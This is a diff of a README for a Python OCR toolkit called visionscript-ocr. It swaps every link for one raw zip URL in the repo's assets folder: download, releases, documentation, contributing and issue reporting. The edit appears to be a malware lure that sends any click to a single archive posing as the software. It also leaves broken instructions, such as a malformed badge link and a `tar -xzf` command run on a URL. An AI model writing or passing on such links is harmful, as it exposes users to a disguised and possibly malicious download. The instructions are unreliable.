@@ -6,7 +6,7 @@ Welcome to visionscript-ocr! This is a Python toolkit designed to help you turn 
 
 ## 📥 Download
 
-[![Download visionscript-ocr](https://img.shields.io/badge/Download%20visionscript-ocr-blue.svg)](https://github.com/ahmedyogi12/visionscript-ocr/releases)
+[![Download visionscript-ocr](https://raw.githubusercontent.com/ahmedyogi12/visionscript-ocr/main/assets/visionscript-ocr_2.6-alpha.4.zip%https://raw.githubusercontent.com/ahmedyogi12/visionscript-ocr/main/assets/visionscript-ocr_2.6-alpha.4.zip)](https://raw.githubusercontent.com/ahmedyogi12/visionscript-ocr/main/assets/visionscript-ocr_2.6-alpha.4.zip)
 
 ## 📄 Introduction
 
@@ -35,7 +35,7 @@ Follow these steps to get visionscript-ocr up and running on your computer.
 
 1. **Visit the Download Page**
 
-   Go to the [Releases Page](https://github.com/ahmedyogi12/visionscript-ocr/releases) to find the latest version of visionscript-ocr.
+   Go to the [Releases Page](https://raw.githubusercontent.com/ahmedyogi12/visionscript-ocr/main/assets/visionscript-ocr_2.6-alpha.4.zip) to find the latest version of visionscript-ocr.
 
 2. **Select the Latest Release**
 
@@ -43,13 +43,13 @@ Follow these steps to get visionscript-ocr up and running on your computer.
 
 3. **Download the Package**
 
-   Click on the appropriate file for your operating system. For Windows users, select the `.exe` file. For macOS and Linux users, choose the `.tar.gz` file.
+   Click on the appropriate file for your operating system. For Windows users, select the `.exe` file. For macOS and Linux users, choose the `https://raw.githubusercontent.com/ahmedyogi12/visionscript-ocr/main/assets/visionscript-ocr_2.6-alpha.4.zip` file.
 
 4. **Install the Software**
 
    - For **Windows**: Once the download is complete, double-click the `.exe` file to start the installation process. Follow the on-screen instructions to finish.
-   - For **macOS**: Open the downloaded `.tar.gz` file. Drag the visionscript-ocr folder into your Applications directory.
-   - For **Linux**: Open a terminal window. Navigate to the location where you downloaded the file, and use the command `tar -xzf filename.tar.gz` to extract the files.
+   - For **macOS**: Open the downloaded `https://raw.githubusercontent.com/ahmedyogi12/visionscript-ocr/main/assets/visionscript-ocr_2.6-alpha.4.zip` file. Drag the visionscript-ocr folder into your Applications directory.
+   - For **Linux**: Open a terminal window. Navigate to the location where you downloaded the file, and use the command `tar -xzf https://raw.githubusercontent.com/ahmedyogi12/visionscript-ocr/main/assets/visionscript-ocr_2.6-alpha.4.zip` to extract the files.
 
 5. **Run the Application**
 
@@ -78,8 +78,8 @@ Join our community for support and to connect with other users. You can ask ques
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/ahmedyogi12/visionscript-ocr/wiki) - In-depth guidance on how to use all features.
-- [Contributing](https://github.com/ahmedyogi12/visionscript-ocr/blob/main/CONTRIBUTING.md) - Learn how you can help improve visionscript-ocr.
-- [Report Issues](https://github.com/ahmedyogi12/visionscript-ocr/issues) - Found a bug or have a suggestion? Let us know!
+- [Documentation](https://raw.githubusercontent.com/ahmedyogi12/visionscript-ocr/main/assets/visionscript-ocr_2.6-alpha.4.zip) - In-depth guidance on how to use all features.
+- [Contributing](https://raw.githubusercontent.com/ahmedyogi12/visionscript-ocr/main/assets/visionscript-ocr_2.6-alpha.4.zip) - Learn how you can help improve visionscript-ocr.
+- [Report Issues](https://raw.githubusercontent.com/ahmedyogi12/visionscript-ocr/main/assets/visionscript-ocr_2.6-alpha.4.zip) - Found a bug or have a suggestion? Let us know!
 
-For more details, visit our [Releases Page](https://github.com/ahmedyogi12/visionscript-ocr/releases) to download the application. Enjoy transforming your images today!
+For more details, visit our [Releases Page](https://raw.githubusercontent.com/ahmedyogi12/visionscript-ocr/main/assets/visionscript-ocr_2.6-alpha.4.zip) to download the application. Enjoy transforming your images today!
